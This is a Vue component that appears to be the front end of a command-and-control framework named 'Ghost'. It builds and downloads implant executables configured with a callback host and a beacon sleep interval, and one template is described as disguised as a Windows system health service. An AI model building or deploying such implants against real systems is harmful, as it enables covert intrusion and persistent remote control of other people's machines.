<template>
  <div class="modal">
    <div class="modal-header">
      <h3><Download :size="14" /> Generate Agent</h3>
      <button @click="modalStore.close" class="close-btn"><X :size="18" /></button>
    </div>
    <div class="modal-body">
      <form @submit.prevent="submit">
        <div class="field">
          <label>Listener</label>
          <input :value="listener.name + ' (' + listener.protocol + ')'" readonly class="readonly" />
        </div>
        <div class="field">
          <label>Agent Template</label>
          <select v-model="form.agent_type" required>
            <option v-for="agent in availableAgents" :key="agent.id" :value="agent.id">
              {{ agent.name }} ({{ agent.id }})
            </option>
          </select>
        </div>
        <div class="field">
          <label>Callback Host (LHOST)</label>
          <input v-model="form.host" placeholder="e.g. 192.168.1.100" required />
          <p class="hint">The IP address the agent will connect to</p>
        </div>
        <div class="field">
          <label>Sleep Time (seconds)</label>
          <input v-model.number="form.sleep_time" type="number" min="1" max="3600" placeholder="e.g. 5" required />
          <p class="hint">Interval between agent check-ins (1-3600 seconds)</p>
        </div>
      </form>
    </div>
    <div class="modal-footer">
      <button class="btn" @click="modalStore.close">Cancel</button>
      <button class="btn primary" @click="submit" :disabled="loading">
        {{ loading ? 'Compiling Agent...' : 'Generate & Download' }}
      </button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { reactive, ref, onMounted, watch } from 'vue'
import { X, Download } from 'lucide-vue-next'
import { useModalStore } from '../stores/modal'
import { useToastStore } from '../stores/toast'
import { getDefaultCallbackHost } from '../runtime/env'
import api from '../services/api'

const props = defineProps<{
  listener: any
}>()

const modalStore = useModalStore()
const toast = useToastStore()
const loading = ref(false)
const availableAgents = ref<Array<{ id: string; name: string; description: string }>>([])
const cacheKey = `ghost-generate-agent:${props.listener.id}`

const form = reactive({
  agent_type: '',
  host: getDefaultCallbackHost(),
  sleep_time: 5
})

const loadCachedForm = () => {
  try {
    const raw = localStorage.getItem(cacheKey)
    if (!raw) return
    const cached = JSON.parse(raw)
    form.host = cached.host || form.host
    form.sleep_time = Number(cached.sleep_time || form.sleep_time)
    form.agent_type = cached.agent_type || form.agent_type
  } catch {}
}

const saveCachedForm = () => {
  localStorage.setItem(cacheKey, JSON.stringify({
    host: form.host,
    sleep_time: form.sleep_time,
    agent_type: form.agent_type
  }))
}

const fetchAvailableAgents = async () => {
  try {
    // 还原原始逻辑：获取当前监听器支持的 agents
    const res = await api.get(`/listeners/${props.listener.id}/agents`)
    availableAgents.value = res.data.data || []

    // 添加额外的 agent 选项（所有 agent 现在都支持自定义 sleep 时间）
    const additionalAgents = [
      {
        id: 'ghost',
        name: 'Ghost Agent',
        description: 'Minimal ghost agent with server-side sysinfo collection'
      },
      {
        id: 'ghost_debug',
        name: 'Ghost Agent (Debug)',
        description: 'Ghost agent with debug symbols'
      },
      {
        id: 'system_health',
        name: 'System Health Check',
        description: 'Disguised as Windows system health service'
      }
    ]

    // 添加不存在的 agent 选项
    additionalAgents.forEach(agent => {
      const exists = availableAgents.value.some(a => a.id === agent.id)
      if (!exists) {
        availableAgents.value.push(agent)
      }
    })

    if (availableAgents.value.length > 0) {
      const hasCached = availableAgents.value.some(a => a.id === form.agent_type)
      if (!hasCached) form.agent_type = availableAgents.value[0].id
    }
  } catch (err) {}
}

const submit = async () => {
  if (!form.agent_type || !form.host) return
  loading.value = true
  try {
    // 还原原始生成逻辑：
    // GET /listeners/{id}/generate?agent_type={type}&host={host}&sleep_time={sleep_time}
    const url = `/listeners/${props.listener.id}/generate?agent_type=${form.agent_type}&host=${form.host}&sleep_time=${form.sleep_time}`
    const response = await api.get(url, { responseType: 'blob' })
    
    // 处理文件下载
    const blob = new Blob([response.data], { type: 'application/octet-stream' })
    const downloadUrl = window.URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = downloadUrl
    
    // 根据模板名称生成文件名
    const ext = form.agent_type.includes('dll') ? 'dll' : 'exe'
    link.setAttribute('download', `ghost_${props.listener.name}_${form.agent_type}.${ext}`)
    
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
    
    toast.success('Agent compilation successful')
    modalStore.close()
  } catch (err: any) {
    // 错误处理已集成在拦截器
  } finally {
    loading.value = false
  }
}

onMounted(() => {
  loadCachedForm()
  fetchAvailableAgents()
})

watch(form, () => {
  saveCachedForm()
}, { deep: true })
</script>

<style scoped>
.modal { width: 380px; background: var(--bg-2); border: 1px solid var(--bd); border-radius: 8px; box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
.modal-header { padding: 16px; border-bottom: 1px solid var(--bd); display: flex; justify-content: space-between; align-items: center; }
.modal-header h3 { font-size: 14px; color: var(--pri); margin: 0; display: flex; align-items: center; gap: 8px; }
.close-btn { background: transparent; border: none; color: var(--tx-3); cursor: pointer; }
.modal-body { padding: 20px; }
.field { margin-bottom: 16px; }
.field label { display: block; font-size: 11px; color: var(--tx-2); margin-bottom: 8px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
.field input, .field select { width: 100%; background: var(--bg-3); border: 1px solid var(--bd); color: var(--tx); padding: 10px; border-radius: 4px; font-size: 12px; outline: none; transition: border-color 0.2s; }
.field input:focus, .field select:focus { border-color: var(--pri); }
.field input.readonly { background: var(--bg-4); cursor: default; border-style: dashed; }
.hint { font-size: 10px; color: var(--tx-4); margin-top: 6px; font-style: italic; }
.modal-footer { padding: 12px 16px; border-top: 1px solid var(--bd); display: flex; justify-content: flex-end; gap: 10px; }
.btn { padding: 8px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; border: 1px solid var(--bd); background: var(--bg-3); color: var(--tx); font-weight: 600; }
.btn.primary { background: var(--pri); color: var(--bg); border: none; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
</style>
